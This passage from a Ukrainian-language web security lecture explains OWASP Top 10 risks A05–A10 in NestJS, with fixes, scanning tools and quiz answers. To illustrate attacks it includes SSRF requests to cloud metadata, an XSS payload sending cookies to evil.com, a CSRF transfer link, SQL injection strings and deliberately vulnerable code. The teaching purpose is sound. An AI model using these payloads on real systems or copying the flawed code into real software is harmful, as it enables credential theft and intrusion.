- Дефолтні паролі для баз даних
- Відкриті порти адміністративних панелей (phpMyAdmin, MongoDB Express)
- Детальні повідомлення про помилки у продакшені

**Захист:**

```typescript
// ✅ Умовна конфігурація для dev/prod
const isProduction = process.env.NODE_ENV === 'production';

app.useGlobalFilters(
  isProduction
    ? new ProductionExceptionFilter() // Приховує деталі помилок
    : new DevelopmentExceptionFilter() // Показує stack traces
);

// ✅ Видалення чутливих заголовків
app.use(helmet({ hidePoweredBy: true }));

// ✅ Відключення stacktraces у продакшені
app.enableCors({
  origin: isProduction ? process.env.ALLOWED_ORIGINS : '*',
});
```

**Приховування деталей помилок:**

```typescript
// src/common/filters/production-exception.filter.ts
@Catch()
export class ProductionExceptionFilter implements ExceptionFilter {
  catch(exception: any, host: ArgumentsHost) {
    const ctx = host.switchToHttp();
    const response = ctx.getResponse<Response>();

    const status = exception.getStatus?.() || 500;

    // У продакшені — загальне повідомлення
    response.status(status).json({
      statusCode: status,
      message: status === 500 ? 'Internal server error' : exception.message,
      // ❌ НЕ відправляємо stack trace у продакшені!
    });

    // Логування деталей лише на сервері
    console.error('Exception:', exception.stack);
  }
}
```

#### A06: Vulnerable and Outdated Components

**Опис:** використання бібліотек та фреймворків з відомими вразливостями.

**Захист:**

```bash
# Перевірка вразливостей у залежностях
npm audit

# Автоматичне виправлення (якщо можливо)
npm audit fix

# Оновлення залежностей до безпечних версій
npm update

# Інструменти для автоматичного моніторингу
npm install -g snyk
snyk test
snyk monitor
```

**GitHub Dependabot:** автоматично створює Pull Requests для оновлення вразливих залежностей.

**Регулярні оновлення:**

```json
{
  "scripts": {
    "audit": "npm audit --production",
    "update-deps": "npm update && npm audit fix"
  }
}
```

#### A07: Identification and Authentication Failures

**Опис:** слабка автентифікація та керування сесіями.

**Приклади:**

- Відсутність rate limiting на `/login` (brute force)
- Слабкі паролі (не вимагається мінімальна складність)
- Відсутність MFA для критичних акаунтів
- Session fixation атаки

**Захист:**

```typescript
// ✅ Вимоги до паролів
import { IsStrongPassword } from 'class-validator';

export class RegisterDto {
  @IsStrongPassword({
    minLength: 8,
    minLowercase: 1,
    minUppercase: 1,
    minNumbers: 1,
    minSymbols: 1,
  })
  password: string;
}

// ✅ Блокування після невдалих спроб
@Injectable()
export class AuthService {
  private failedAttempts = new Map<string, number>();

  async login(email: string, password: string) {
    const attempts = this.failedAttempts.get(email) || 0;

    if (attempts >= 5) {
      throw new UnauthorizedException('Account locked. Try again in 15 minutes.');
    }

    const user = await this.userService.findByEmail(email);

    if (!user || !(await bcrypt.compare(password, user.password))) {
      this.failedAttempts.set(email, attempts + 1);
      
      // Скинути лічильник через 15 хвилин
      setTimeout(() => this.failedAttempts.delete(email), 15 * 60 * 1000);

      throw new UnauthorizedException('Invalid credentials');
    }

    // Успішний логін — скинути лічильник
    this.failedAttempts.delete(email);

    return this.generateToken(user);
  }
}
```

#### A08: Software and Data Integrity Failures

**Опис:** недостатня верифікація джерел коду та даних.

**Приклади:**

- Завантаження npm пакетів без перевірки integrity hash
- Auto-update без перевірки цифрового підпису
- Десеріалізація ненадійних даних

**Захист:**

```bash
# Використання package-lock.json для integrity hashes
npm ci  # Замість npm install у CI/CD

# Перевірка підпису пакетів
npm config set sign-git-tag true
```

**Безпечна десеріалізація:**

```typescript
// ❌ НЕБЕЗПЕЧНО: eval() або Function() з user input
eval(userInput); // Ніколи!

// ✅ БЕЗПЕЧНО: JSON.parse() з валідацією
import { plainToClass } from 'class-transformer';
import { validate } from 'class-validator';

@Post('data')
async processData(@Body() data: string) {
  // Парсинг JSON
  const parsed = JSON.parse(data);

  // Трансформація у typed клас
  const dto = plainToClass(CreateUserDto, parsed);

  // Валідація
  const errors = await validate(dto);
  if (errors.length > 0) {
    throw new BadRequestException('Validation failed');
  }

  return this.userService.create(dto);
}
```

#### A09: Security Logging and Monitoring Failures

**Опис:** недостатнє логування безпеки та відсутність моніторингу.

**Приклади:**

- Не логуються спроби несанкціонованого доступу
- Відсутні алерти при підозрілій активності
- Логи не зберігаються достатньо довго

**Захист:**

```typescript
// src/common/interceptors/security-logging.interceptor.ts
import { Injectable, NestInterceptor, ExecutionContext, CallHandler, Logger } from '@nestjs/common';
import { Observable } from 'rxjs';
import { tap } from 'rxjs/operators';

@Injectable()
export class SecurityLoggingInterceptor implements NestInterceptor {
  private logger = new Logger('Security');

  intercept(context: ExecutionContext, next: CallHandler): Observable<any> {
    const request = context.switchToHttp().getRequest();
    const { method, url, ip, user } = request;

    // Логування важливих дій
    if (this.isSensitiveEndpoint(url)) {
      this.logger.log(
        `[${method}] ${url} | IP: ${ip} | User: ${user?.id || 'anonymous'}`
      );
    }

    return next.handle().pipe(
      tap({
        error: (error) => {
          // Логування помилок безпеки
          if (error.status === 401 || error.status === 403) {
            this.logger.warn(
              `Access denied: [${method}] ${url} | IP: ${ip} | User: ${user?.id || 'anonymous'}`
            );
          }
        },
      })
    );
  }

  private isSensitiveEndpoint(url: string): boolean {
    const sensitivePatterns = ['/auth', '/admin', '/users', '/payments'];
    return sensitivePatterns.some(pattern => url.includes(pattern));
  }
}
```

**Інтеграція з системами моніторингу:**

```typescript
// src/monitoring/security-alerts.service.ts
import { Injectable } from '@nestjs/common';
import * as Sentry from '@sentry/node';

@Injectable()
export class SecurityAlertsService {
  sendAlert(message: string, context: any) {
    // Логування
    console.error(`[SECURITY ALERT] ${message}`, context);

    // Відправити до Sentry
    Sentry.captureMessage(message, {
      level: 'error',
      extra: context,
    });

    // Відправити у Slack (опціонально)
    // await this.slackService.sendAlert(message);
  }

  async checkForAnomalies(userId: string) {
    // Приклад: детекція аномальної активності
    const recentLogins = await this.getRecentLogins(userId);

    // Якщо логін з нової країни
    const countries = recentLogins.map(l => l.country);
    const uniqueCountries = new Set(countries);

    if (uniqueCountries.size > 2) {
      this.sendAlert('Suspicious login activity detected', {
        userId,
        countries: Array.from(uniqueCountries),
      });
    }
  }
}
```

#### A10: Server-Side Request Forgery (SSRF)

**Опис:** зловмисник змушує сервер виконати запити до внутрішніх ресурсів або зовнішніх систем.

**Приклад вразливого коду:**

```typescript
// ❌ НЕБЕЗПЕЧНО: fetching user-provided URL
@Get('fetch')
async fetchUrl(@Query('url') url: string) {
  const response = await fetch(url);
  return response.text();
}
```

**Атака:**

```
GET /fetch?url=http://localhost:6379/  # Доступ до внутрішнього Redis
GET /fetch?url=http://169.254.169.254/latest/meta-data/  # AWS metadata (credentials!)
```

**Захист:**

```typescript
// ✅ Whitelist дозволених доменів
const ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com'];

@Get('fetch')
async fetchUrl(@Query('url') url: string) {
  const parsedUrl = new URL(url);

  // Перевірка домену
  if (!ALLOWED_DOMAINS.includes(parsedUrl.hostname)) {
    throw new BadRequestException('Domain not allowed');
  }

  // Заборона локальних IP
  if (this.isPrivateIp(parsedUrl.hostname)) {
    throw new BadRequestException('Access to private networks is forbidden');
  }

  const response = await fetch(url);
  return response.text();
}

private isPrivateIp(hostname: string): boolean {
  const privateRanges = [
    /^127\./,           // localhost
    /^10\./,            // 10.0.0.0/8
    /^172\.(1[6-9]|2[0-9]|3[01])\./,  // 172.16.0.0/12
    /^192\.168\./,      // 192.168.0.0/16
    /^169\.254\./,      // AWS metadata
  ];

  return privateRanges.some(regex => regex.test(hostname));
}
```

---

## Інструменти для тестування безпеки

### 1. OWASP ZAP (Zed Attack Proxy)

**Опис:** безкоштовний інструмент для автоматичного сканування вразливостей.

**Встановлення:**

```bash
# Docker
docker pull zaproxy/zap-stable

# Запуск сканування
docker run -t zaproxy/zap-stable zap-baseline.py -t http://localhost:3000
```

**Інтеграція у CI/CD:**

```yaml
# .github/workflows/security-scan.yml
name: Security Scan

on: [push, pull_request]

jobs:
  zap-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Start application
        run: |
          npm install
          npm run build
          npm start &
          sleep 10

      - name: ZAP Scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'http://localhost:3000'
```

### 2. npm audit

**Перевірка вразливостей у залежностях:**

```bash
# Базовий аудит
npm audit

# Детальний звіт
npm audit --json > audit-report.json

# Автоматичне виправлення
npm audit fix

# Примусове виправлення (breaking changes)
npm audit fix --force
```

### 3. Snyk

**Інтеграція з GitHub:**

```yaml
# .github/workflows/snyk.yml
name: Snyk Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run Snyk to check for vulnerabilities
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

### 4. SonarQube

**Статичний аналіз коду:**

```bash
# Docker Compose
docker compose up -d sonarqube

# Сканування проєкту
npx sonarqube-scanner \
  -Dsonar.projectKey=my-project \
  -Dsonar.sources=./src \
  -Dsonar.host.url=http://localhost:9000 \
  -Dsonar.login=YOUR_TOKEN
```

---

## Best Practices для Security

### 1. Principle of Least Privilege

Надавайте мінімальні необхідні права:

```typescript
// ✅ Різні ролі з різними правами
export enum Role {
  USER = 'user',           // Може читати свій профіль
  MODERATOR = 'moderator', // Може модерувати контент
  ADMIN = 'admin',         // Повний доступ
}

@Get('users/:id')
@Roles(Role.ADMIN, Role.MODERATOR) // Лише admin та moderator
async getUser(@Param('id') id: string) {
  return this.userService.findOne(id);
}
```

### 2. Defense in Depth

Кілька рівнів захисту:

```
Рівень 1: Network Firewall (блокування IP)
Рівень 2: Rate Limiting (обмеження запитів)
Рівень 3: JWT Authentication (перевірка токену)
Рівень 4: RBAC Guards (перевірка ролей)
Рівень 5: Resource-level Authorization (перевірка ownership)
Рівень 6: Data Validation (перевірка вводу)
```

### 3. Регулярні Security Audits

```bash
# Щотижневий автоматичний аудит
npm audit
snyk test
npm outdated
```

### 4. Security Headers (повторення з попередніх лекцій)

```typescript
app.use(helmet());  // CSP, HSTS, X-Frame-Options, тощо
```

### 5. Безпечне зберігання credentials

```bash
# ❌ Не зберігайте у коді
const API_KEY = 'sk_live_abc123';

# ✅ Використовуйте змінні оточення
const API_KEY = process.env.API_KEY;

# ✅ Або secrets management (AWS Secrets Manager, HashiCorp Vault)
```

---

## Інтерактивні запитання для самоперевірки

::accordion

::accordion-item{label="❓ Чому Content Security Policy не може повністю захистити від Stored XSS?" icon="i-lucide-help-circle"}

**Content Security Policy (CSP)** блокує виконання **inline scripts** та обмежує джерела завантаження зовнішніх scripts. Це дуже ефективно проти **Reflected XSS** (де script впроваджується через URL та виконується відразу).

Проте **Stored XSS** часто використовує **вже дозволені джерела** або обходить CSP через DOM-based вразливості:

**Приклад обходу CSP:**

```html
<!-- Зловмисний коментар, збережений у БД -->
<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">
```

**CSP не блокує:**
- `onerror` events на `<img>` (це не inline script, а event handler)
- Запити до `https://evil.com` (якщо CSP дозволяє `connect-src *` або `https:`)

**Правильний захист від Stored XSS:**

1. **Санітизація HTML** при збереженні у БД (видаляти всі event handlers)
2. **Екранування** при виведенні (перетворювати `<` на `&lt;`)
3. **CSP як додатковий рівень** (не єдиний)
4. **Використання `textContent` замість `innerHTML`** у frontend

**Висновок:** CSP — це важливий захист, але **не може замінити** санітизацію та екранування user input.

::

::accordion-item{label="❓ Чому SameSite=Lax не захищає від CSRF атак через GET запити?" icon="i-lucide-help-circle"}

**SameSite=Lax** дозволяє відправлення cookies у **top-level navigation GET requests** (коли користувач переходить за посиланням).

**Сценарій атаки:**

1. Зловмисник створює посилання:
   ```html
   <a href="https://bank.com/transfer?to=attacker&amount=1000">
     Виграй iPhone!
   </a>
   ```

2. Користувач натискає посилання → браузер відправляє GET запит з session cookie (через SameSite=Lax).

3. Якщо backend **неправильно спроєктований** та виконує зміни через GET:
   ```typescript
   // ❌ НЕБЕЗПЕЧНО: зміна стану через GET
   @Get('transfer')
   async transfer(@Query('to') to: string, @Query('amount') amount: number) {
     return this.bankService.transfer(to, amount);
   }
   ```

…то атака вдалася!

**Правильний дизайн:**

- **GET requests** мають бути **ідемпотентними** (лише читання, без змін)
- **POST/PUT/DELETE** для змін стану (SameSite=Lax блокує cookies для цих методів)

**Додатковий захист:** використовуйте CSRF tokens навіть з SameSite=Lax.

::

::accordion-item{label="❓ Як зловмисник може обійти параметризовані запити?" icon="i-lucide-help-circle"}

**Параметризовані запити (Prepared Statements)** ефективно захищають від **класичної SQL Injection**, але існують **інші вектори атак**:

**1. Ін'єкція через ORDER BY / LIMIT:**

```typescript
// ❌ Параметризація не працює для динамічних імен колонок
const sortBy = req.query.sort; // Може бути: "name; DROP TABLE users--"

const query = `SELECT * FROM users ORDER BY ${sortBy}`; // Вразливо!
```

**Рішення:** використовуйте whitelist:

```typescript
const ALLOWED_SORT_FIELDS = ['name', 'email', 'createdAt'];

if (!ALLOWED_SORT_FIELDS.includes(sortBy)) {
  throw new BadRequestException('Invalid sort field');
}
```

**2. Second-Order SQL Injection:**

Зловмисник зберігає payload у БД, який виконується пізніше:

```typescript
// Крок 1: Зберегти зловмисний username (з параметризацією — безпечно)
await db.query('INSERT INTO users (username) VALUES (?)', ["admin'--"]);

// Крок 2: Витягнути username та використати у запиті БЕЗ параметризації
const user = await db.query('SELECT username FROM users WHERE id = 1');
const username = user[0].username; // "admin'--"

// ❌ НЕБЕЗПЕЧНО: використання збереженого значення без параметризації
const stats = await db.query(`SELECT * FROM stats WHERE username = '${username}'`);
// SQL: SELECT * FROM stats WHERE username = 'admin'--'
```

**Рішення:** **завжди** використовуйте параметризацію, навіть для даних з БД.

**Висновок:** параметризовані запити — це не "срібна куля". Потрібна комплексна валідація та whitelist підходи.

::

::

---

## Підсумок

::card-group

::card{title="🛡️ Основні атаки" icon="i-lucide-shield"}

**Найнебезпечніші вразливості:**
- **XSS** — ін'єкція JavaScript, крадіжка cookies/токенів
- **CSRF** — виконання дій від імені жертви
- **SQL Injection** — несанкціонований доступ до БД
- **Path Traversal** — читання системних файлів
- **Command Injection** — виконання системних команд

**Кожна вразливість потребує специфічного захисту**

::

::card{title="⚙️ Методи захисту" icon="i-lucide-settings"}

**Універсальні принципи:**
- **Валідація та санітизація** всього user input
- **Екранування** при виведенні (XSS)
- **Параметризовані запити** (SQL Injection)
- **Whitelist підхід** (Path Traversal, Command Injection)
- **CSRF tokens** + **SameSite cookies**

**Використовуйте ORM та бібліотеки для автоматичного захисту**

::

::card{title="🔍 OWASP Top 10" icon="i-lucide-search"}

**Стандарт оцінки безпеки:**
- Broken Access Control
- Cryptographic Failures
- Injection (SQL, NoSQL, Command)
- Insecure Design
- Security Misconfiguration

**Регулярні аудити через npm audit, Snyk, OWASP ZAP**

::

::

У наступній (останній) лекції цього модуля ми розглянемо **налаштування HTTPS у продакшені** через Let's Encrypt, Nginx та Traefik — завершальний крок для забезпечення безпечної передачі даних між клієнтом та сервером.
